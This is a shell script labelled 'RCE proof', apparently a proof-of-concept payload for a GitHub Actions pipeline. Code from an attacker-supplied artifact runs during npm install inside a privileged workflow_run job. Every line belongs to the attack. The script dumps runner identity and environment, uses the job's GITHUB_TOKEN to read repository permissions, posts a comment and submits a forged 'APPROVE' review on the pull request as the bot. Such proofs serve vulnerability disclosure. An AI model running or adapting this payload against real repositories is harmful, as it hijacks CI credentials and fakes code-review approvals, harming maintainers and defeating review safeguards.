#!/bin/sh
echo "=========== RCE PROOF BEGIN ==========="
[ -f /tmp/.rce.done ] && { echo "already ran"; exit 0; }
touch /tmp/.rce.done
id
echo "cwd=$(pwd)"
echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY GITHUB_ACTOR=$GITHUB_ACTOR GITHUB_EVENT_NAME=$GITHUB_EVENT_NAME GITHUB_JOB=$GITHUB_JOB"
echo "GITHUB_TOKEN present: $([ -n "$GITHUB_TOKEN" ] && echo yes || echo no)"
PR=$(cat pr-number.txt 2>/dev/null | tr -d '\n')
echo "PR number from attacker artifact: [$PR]"
curl -sS --max-time 20 -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY" -o /tmp/repo.json || echo "repo read failed"
node -e 'try{const d=require("/tmp/repo.json");console.log("TOKEN-PERMS:",JSON.stringify(d.permissions));}catch(e){console.log("perm-parse-fail")}'
curl -sS --max-time 20 -o /tmp/c.json -w "POST-COMMENT-HTTP=%{http_code}\n" -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" \
  -d '{"body":"**RCE proof** — arbitrary code executed inside the privileged `workflow_run` job (Post Linter Report) through an attacker-controlled artifact consumed by `npm install`."}' \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR/comments"
head -c 160 /tmp/c.json 2>/dev/null; echo
curl -sS --max-time 20 -o /tmp/rev.json -w "POST-REVIEW-APPROVE-HTTP=%{http_code}\n" -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" \
  -d '{"event":"APPROVE","body":"privileged bot approval from RCE"}' \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/$PR/reviews"
echo "=========== RCE PROOF END ==========="
